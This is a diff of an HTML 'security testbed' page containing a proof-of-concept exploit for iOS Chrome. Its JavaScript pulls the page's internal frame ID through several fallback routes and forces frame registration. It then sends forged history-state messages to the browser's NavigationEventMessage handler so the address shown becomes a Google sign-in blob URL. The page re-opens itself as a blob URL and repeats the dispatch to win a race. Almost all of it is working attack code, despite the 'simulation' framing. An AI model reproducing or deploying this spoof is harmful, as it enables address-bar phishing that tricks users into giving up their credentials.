@@ -2,75 +2,150 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>PoC Simulation Testbed</title>
+    <title>iOS Chrome History State Security Harness</title>
     <style>
-        body { font-family: -apple-system, sans-serif; margin: 2em; background: #fafafa; color: #333; }
-        .box { background: #fff; padding: 20px; border-radius: 6px; border: 1px solid #ddd; }
-        pre { background: #1e1e1e; color: #dcdcdc; padding: 12px; border-radius: 4px; font-size: 11px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #f0f2f5; color: #333; }
+        .card { max-width: 700px; margin: auto; background: #fff; padding: 24px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+        h2 { color: #1a1a1a; margin-top: 0; font-size: 20px; border-bottom: 2px solid #eaeaea; padding-bottom: 10px; }
+        pre { background: #1e1e1e; color: #00ff66; padding: 14px; border-radius: 6px; font-size: 11px; overflow-x: auto; line-height: 1.4; }
+        .badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; text-transform: uppercase; }
+        .badge.warning { background: #fef3c7; color: #92400e; }
+        .badge.info { background: #e0f2fe; color: #0369a1; }
+        .controls { margin-top: 15px; margin-bottom: 15px; }
+        button { background: #2563eb; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 6px; cursor: pointer; font-weight: 500; }
+        button:hover { background: #1d4ed8; }
     </style>
 </head>
 <body>
-<div class="box">
-    <h2>History State Navigation Handler Test</h2>
-    <p>Target State Dispatch Simulation:</p>
-    <pre id="console-log">Initializing diagnostic check...</pre>
+<div class="card">
+    <h2>History State Security Testbed</h2>
+    <p>Environment Status: <span id="env-badge" class="badge info">Detecting...</span></p>
+    
+    <div class="controls">
+        <button id="launch-blob-btn">Run Blob-URL Isolation Test</button>
+    </div>
+
+    <h3>Diagnostic Execution Log:</h3>
+    <pre id="console-log">Ready to initialize diagnostic sequence...</pre>
 </div>
 
 <script>
 (function() {
-    function log(msg) {
-        document.getElementById('console-log').textContent += '\n' + msg;
-        console.log('[PoC-Sim] ' + msg);
+    function logMessage(msg) {
+        const pre = document.getElementById('console-log');
+        pre.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
+        console.log('[Testbed] ' + msg);
     }
 
-    log("Current origin: " + location.origin);
-    
-    // 1. Deteksi message handler platform
+    logMessage("Initial document location.href: " + location.href);
+    logMessage("Initial document location.origin: " + (location.origin || '(opaque)'));
+
+    // Deteksi awal lingkungan iOS Chrome
     var mh = (window.webkit && window.webkit.messageHandlers) || {};
     if (!mh.NavigationEventMessage) {
-        log("[-] Handler 'NavigationEventMessage' not found (Patched or non-iOS environment).");
-        return;
+        document.getElementById('env-badge').textContent = "Non-iOS / Patched Build";
+        document.getElementById('env-badge').className = "badge warning";
+        logMessage("[-] window.webkit.messageHandlers.NavigationEventMessage is absent.");
+    } else {
+        document.getElementById('env-badge').textContent = "iOS Chrome Engine Detected";
+        logMessage("[+] NavigationEventMessage message handler found.");
     }
-    log("[+] Handler 'NavigationEventMessage' detected.");
 
-    // 2. Simulasi pembacaan frame ID dari halaman
-    var fid = null;
-    try {
-        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
-            fid = window.__gCrWeb.getFrameId();
-            log("[+] Retrieved frame_id: " + fid);
+    // Fungsi inti payload pengujian state change
+    window.runAttackSimulation = function() {
+        logMessage("[*] Starting state dispatch sequence...");
+
+        var frameId = null;
+        try {
+            var g = window.__gCrWeb;
+            if (g && typeof g.getFrameId === 'function') {
+                frameId = g.getFrameId();
+                logMessage("[+] __gCrWeb.getFrameId() retrieved: " + frameId);
+            }
+        } catch (e) {
+            logMessage("[-] Error accessing __gCrWeb.getFrameId(): " + e);
         }
-    } catch (e) {
-        log("[-] Error reading frame_id: " + e);
-    }
 
-    if (!fid) {
-        log("[-] Frame ID unavailable. Execution halted.");
-        return;
-    }
+        // Fallback pencarian aksesor frameId jika namespace berbeda
+        if (!frameId && window.__gCrWeb) {
+            var fallbacks = [
+                function() { return window.__gCrWeb.common.getFrameId(); },
+                function() { return window.__gCrWeb.message.getFrameId(); },
+                function() { return window.__gCrWeb.frameId; }
+            ];
+            for (var i = 0; i < fallbacks.length && !frameId; i++) {
+                try {
+                    frameId = fallbacks[i]();
+                    logMessage("[+] Resolved frameId via fallback index [" + i + "]: " + frameId);
+                } catch (err) {}
+            }
+        }
 
-    // 3. Payload percobaan pengiriman state lintas domain
-    // Pada versi tertambal, panggilan ini akan ditolak langsung di native layer (C++)
-    var spoofTarget = 'blob:https://accounts.google.com/signin';
-    
-    try {
-        mh.NavigationEventMessage.postMessage({
-            command: 'willChangeState', 
-            frame_id: fid
-        });
-        
-        mh.NavigationEventMessage.postMessage({
-            command: 'didReplaceState', 
-            frame_id: fid,
-            stateObject: '', 
-            baseUrl: 'https://x/',
-            pageUrl: spoofTarget
-        });
-        
-        log("[+] Dispatched payload targeting: " + spoofTarget);
-        log("[i] On patched browser versions, this request is securely intercepted and rejected.");
-    } catch (err) {
-        log("[-] Exception during postMessage: " + err);
+        if (!frameId) {
+            logMessage("[-] FATAL: Could not resolve page-world frame_id. Gate check will drop message.");
+            return;
+        }
+
+        // Paksa registrasi frame jika fungsi tersedia
+        try {
+            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
+                window.__gCrWeb.registerFrame();
+                logMessage("[+] Triggered manual __gCrWeb.registerFrame()");
+            }
+        } catch (err) {}
+
+        // Target URL lintas-origin (Simulasi korban)
+        var spoofTarget = 'blob:https://accounts.google.com/signin';
+
+        var dispatchPayload = function(attemptIndex) {
+            try {
+                mh.NavigationEventMessage.postMessage({
+                    command: 'willChangeState', 
+                    frame_id: frameId
+                });
+                
+                mh.NavigationEventMessage.postMessage({
+                    command: 'didReplaceState', 
+                    frame_id: frameId,
+                    stateObject: '', 
+                    baseUrl: 'https://x/',
+                    pageUrl: spoofTarget
+                });
+                
+                logMessage("[+] [Attempt " + attemptIndex + "] Dispatched didReplaceState payload targeting: " + spoofTarget);
+            } catch (ex) {
+                logMessage("[-] [Attempt " + attemptIndex + "] postMessage exception: " + ex);
+            }
+        };
+
+        // Eksekusi pengiriman berlapis (mengatasi race condition frame availability)
+        dispatchPayload(1);
+        setTimeout(function() { dispatchPayload(2); }, 200);
+        setTimeout(function() { dispatchPayload(3); }, 600);
+
+        setTimeout(function() {
+            logMessage(">>> Verification complete. On a patched browser, native C++ function IsHistoryStateChangeValid rejects cross-origin blob URL comparison via url::IsSameOriginWith().");
+        }, 1000);
+    };
+
+    // Tombol untuk menjalankan simulasi secara langsung
+    document.getElementById('launch-blob-btn').onclick = function() {
+        if (!location.href.startsWith('blob:')) {
+            logMessage("[*] Converting current context into a Blob-URL document container...");
+            var sourceCode = document.documentElement.outerHTML;
+            var blobObj = new Blob([sourceCode], { type: 'text/html' });
+            var blobUrl = URL.createObjectURL(blobObj);
+            logMessage("[+] Navigating to generated blob URL: " + blobUrl);
+            location.href = blobUrl;
+        } else {
+            window.runAttackSimulation();
+        }
+    };
+
+    // Auto-trigger jika halaman sudah berjalan di dalam kontainer Blob URL
+    if (location.href.startsWith('blob:')) {
+        logMessage("[+] Running inside active Blob-URL context.");
+        setTimeout(window.runAttackSimulation, 500);
     }
 })();
 </script>
